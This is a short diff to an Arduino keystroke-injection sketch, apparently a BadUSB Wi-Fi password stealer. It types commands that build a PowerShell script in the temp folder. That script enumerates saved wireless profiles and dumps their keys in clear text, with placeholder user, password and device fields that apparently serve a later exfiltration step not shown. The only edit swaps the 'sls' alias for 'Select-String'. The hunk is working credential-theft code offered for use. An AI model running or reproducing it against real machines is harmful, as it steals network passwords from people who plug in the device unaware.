@@ -18,7 +18,7 @@ void setup(){
   Keyboard.println("echo $user = \"INPUT1\" >> %temp%\\wl.ps1");
   Keyboard.println("echo $pass = \"INPUT2\" >> %temp%\\wl.ps1");
   Keyboard.println("echo $dev = \"INPUT3\" >> %temp%\\wl.ps1");
-  Keyboard.println("echo $w = netsh wlan show profiles ^| sls -Pattern \"All User Profile\" ^| foreach {$_.ToString()} >> %temp%\\wl.ps1");
+  Keyboard.println("echo $w = netsh wlan show profiles ^| Select-String -Pattern \"All User Profile\" ^| foreach {$_.ToString()} >> %temp%\\wl.ps1");
   Keyboard.println("echo $ed = $w ^| foreach {$_.Replace(\"    All User Profile     : \",$null)} >> %temp%\\wl.ps1");
   Keyboard.println("echo $pv = $ed ^| foreach {netsh wlan show profiles name=\"$_\" key=clear} >> %temp%\\wl.ps1");
   
